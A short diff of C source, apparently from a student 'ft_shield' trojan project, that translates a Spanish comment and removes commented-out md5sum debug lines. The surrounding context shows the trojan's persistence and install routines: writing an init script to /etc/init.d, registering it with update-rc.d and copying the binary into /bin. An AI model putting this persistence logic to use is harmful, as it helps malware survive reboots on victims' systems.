@@ -12,7 +12,7 @@ int ft_persistence(t_troyan *shield)
     fprintf(shield->fd_init, PERSISTENCE, 34, 34, 10, 10, 10, 10, 10, 10, 10, 10);
     fclose(shield->fd_init);
     chmod("/etc/init.d/ft_shield", 0755);
-    system("update-rc.d ft_shield defaults");         // Registro en el sistema
+    system("update-rc.d ft_shield defaults");               // Registration in the system
     return(0);
 }
 
@@ -36,10 +36,6 @@ int ft_payload(t_troyan *shield)
     fclose(shield->fd);
     fclose(shield->fd_dest);
     chmod("/bin/ft_shield", 0755);
-    // printf("- Comprobamos que la copia de nuestro binario es exacta:\n");
-    // printf("--------------------------------------------------------\n");
-    // system("md5sum ./ft_shield /bin/ft_shield ");
-    // printf("--------------------------------------------------------\n");
     return(0);
 }
 
